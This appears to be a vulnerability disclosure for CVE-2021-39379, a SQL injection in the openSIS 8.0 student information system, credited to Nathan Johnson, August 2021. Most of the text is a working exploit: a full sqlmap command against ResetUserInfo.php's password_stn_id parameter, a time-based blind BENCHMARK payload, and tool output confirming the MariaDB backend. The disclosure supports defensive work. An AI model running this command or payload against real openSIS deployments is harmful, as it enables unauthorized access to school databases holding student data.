# OPENSIS 8.0 SQL INJECTION VULNERABILITY CVE-2021-39379

A SQL Injection vulnerability exists in version 8.0 of openSIS when MySQL (MariaDB) is being used as the application database. A malicious attacker can issue SQL commands to the MySQL (MariaDB) database through the vulnerable password_stn_id parameter. 

Vulnerable PHP Page:

ResetUserInfo.php

Vulnerable Payload

sqlmap -u "http://localhost:8081/ResetUserInfo.php" --data="pass_user_type=pass_student&pass_type_form=password&password_stn_id=1234&uname=1234&month_password_dob=08&day_password_dob=01&year_password_dob=2021&pass_email=&password_stf_email=" --referer="http://localhost:8081/ForgotPass.php?language=en" --dbms="MySQL" --level=3 --risk=3 --banner --answers="crack=N,dict=N,continue=Y,quit=N"

SQL Injection:

http://localhost:8081/ResetUserInfo.php             
```
Parameter: password_stn_id (POST)
    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
    Payload: pass_user_type=pass_student&pass_type_form=password&password_stn_id=1234 AND 1211=BENCHMARK(5000000,MD5(0x6a65474d))&uname=1234&month_password_dob=08&day_password_dob=01&year_password_dob=2021&pass_email=&password_stf_email=
    
[21:11:37] [INFO] testing MySQL
[21:11:44] [INFO] confirming MySQL
[21:11:44] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[21:11:56] [INFO] the back-end DBMS is MySQL
[21:11:56] [INFO] fetching banner
[21:11:56] [INFO] retrieved: 10.5.11-MariaDB-1
web application technology: PHP 7.4.21
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
banner: '10.5.11-MariaDB-1'
```

Discovered by Nathan Johnson, August 2021
